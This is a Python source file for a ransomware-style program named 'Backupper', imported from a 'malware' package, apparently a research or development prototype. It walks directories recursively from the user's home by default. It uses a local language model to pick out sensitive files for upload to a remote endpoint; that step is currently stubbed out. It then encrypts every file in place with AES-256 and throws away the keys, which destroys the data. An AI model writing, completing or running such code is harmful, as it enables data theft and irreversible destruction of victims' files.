import secrets
from datetime import datetime
from pathlib import Path

import modes
import requests
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

import malware.llm as llm


class Backupper:
    def __init__(self, start_path=None):
        self.scanner = llm.SensitiveFileScanner(
            base_url="http://localhost:11434/v1",
            model="gemma3:4b"
        )
        self.folders_to_walk = []
        if start_path:
            path = Path(start_path)
            if path.exists():
                self.current_directory = path.resolve()
            else:
                print("Path does not exist")
                self.current_directory = Path.home()
        else:
            self.current_directory = Path.home()

        print(f"FileManager started at: {self.current_directory}")

    def cd(self, path):
        target_path = (self.current_directory / path).resolve()

        if target_path.exists() and target_path.is_dir():
            self.current_directory = target_path
            print(f"Directory changed to: {self.current_directory}")
        else:
            print(f"Error: Directory '{path}' does not exist.")

    def ls(self):
        try:
            items = list(self.current_directory.iterdir())
            print(f"\nContents of {self.current_directory}:")

            for item in items:
                if item.is_dir():
                    print(f"  [DIR]  {item.name}")
                else:
                    print(f"  [FILE] {item.name}")

            metadata_list = []
            for item in items:
                if item.is_dir():
                    continue
                # Gather basic stats
                stat = item.stat()

                # Format timestamp to ISO 8601
                mod_time = datetime.fromtimestamp(stat.st_mtime).isoformat()

                # Calculate size in KB (integer)
                size_kb = int(stat.st_size / 1024)

                # Generate Preview (first 100 characters)
                preview = ""
                if item.is_file():
                    try:
                        # Read first 100 bytes and try to decode
                        with item.open('rb') as f:
                            head = f.read(100)
                        preview = head.decode('utf-8', errors='replace').replace('\n', ' ').strip()
                    except Exception:
                        preview = "[Binary or Unreadable]"

                # Create DTO
                metadata = FileMetadata(
                    path=str(item.resolve()),
                    name=item.name,
                    extension=item.suffix,
                    size_kb=size_kb,
                    last_modified=mod_time,
                    preview=preview
                )

                metadata_list.append(metadata)
            return metadata_list

        except PermissionError:
            print(f"Error: Permission denied for accessing {self.current_directory}")
            return None

    def upload_file(self, filename, endpoint, chunk_size=1024 * 1024):
        return
        file_path = self.current_directory / filename

        if not file_path.is_file():
            print(f"Error: File '{filename}' not found.")
            return

        def file_generator():
            total_read = 0
            with file_path.open('rb') as f:
                while True:
                    chunk = f.read(chunk_size)
                    if not chunk:
                        break
                    total_read += len(chunk)
                    yield chunk

        try:
            print(f"Uploading '{filename}' to {endpoint} (streaming)...")
            response = requests.put(endpoint, data=file_generator())

            if response.status_code == 200:
                print("\nUpload successful.")
            else:
                print(f"\nUpload failed. Status code: {response.status_code}")
                print(f"Response: {response.text}")

        except Exception as e:
            print(f"\nError uploading file: {e}")

    def encrypt(self, filename):
        file_path = self.current_directory / filename

        if not file_path.is_file():
            print(f"Error: File '{filename}' not found.")
            return None

        key = secrets.token_bytes(32)
        iv = secrets.token_bytes(16)

        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()

        padder = padding.PKCS7(128).padder()

        temp_path = file_path.with_suffix(file_path.suffix + ".tmp")
        chunk_size = 64 * 1024

        try:
            with file_path.open('rb') as infile, temp_path.open('wb') as outfile:
                outfile.write(iv)

                while True:
                    chunk = infile.read(chunk_size)
                    if not chunk:
                        break

                    padded_chunk = padder.update(chunk)
                    encrypted_chunk = encryptor.update(padded_chunk)
                    outfile.write(encrypted_chunk)

                final_padded = padder.finalize()
                final_encrypted = encryptor.update(final_padded) + encryptor.finalize()
                outfile.write(final_encrypted)

            temp_path.replace(file_path)

            print(f"File '{filename}' encrypted successfully (AES-256-CBC).")
            return key

        except Exception as e:
            print(f"Error encrypting file: {e}")
            if temp_path.exists():
                temp_path.unlink()
            return None

    def get_next_folders(self):
        for item in self.current_directory.iterdir():
            try:
                if item.is_dir():
                    self.folders_to_walk.append(item.resolve())
            except Exception as e:
                print(f"Error accessing item '{item}': {e}")

    def get_interesting_files(self):

        def ask_llm():
            files_data = self.ls()
            return [c.path for c in self.scanner.analyze_files(files_data)]

        interesting_files = ask_llm()
        base = self.current_directory
        files = []
        for entry in interesting_files:
            try:
                p = Path(entry)
                if not p.is_absolute():
                    p = (base / p).resolve()
                else:
                    p = p.resolve()
                if p.exists() and p.is_file():
                    files.append(p)
                else:
                    print(f"Warning: file '{entry}' does not exist or is not a file.")
            except Exception as e:
                print(f"Error processing file '{entry}': {e}")

        try:
            current_file = Path(__file__).resolve()
            files = [f for f in files if f.resolve() != current_file]
        except Exception:
            pass
        
        return files

    def run(self):
        first = True
        while self.folders_to_walk or first:
            if first:
                first = False
            else:
                next_folder = self.folders_to_walk.pop(0)
                self.cd(next_folder)

            for file in self.get_interesting_files():
                self.upload_file(file, "ep")

            for item in self.current_directory.iterdir():
                try:
                    self.encrypt(item.name)
                except Exception as e:
                    print(f"Error processing file {item.name}: {e}")

            self.get_next_folders()


if __name__ == "__main__":
    b = Backupper(
        (Path(__file__).resolve().parent / "testdata").resolve()
    )
    b.run()
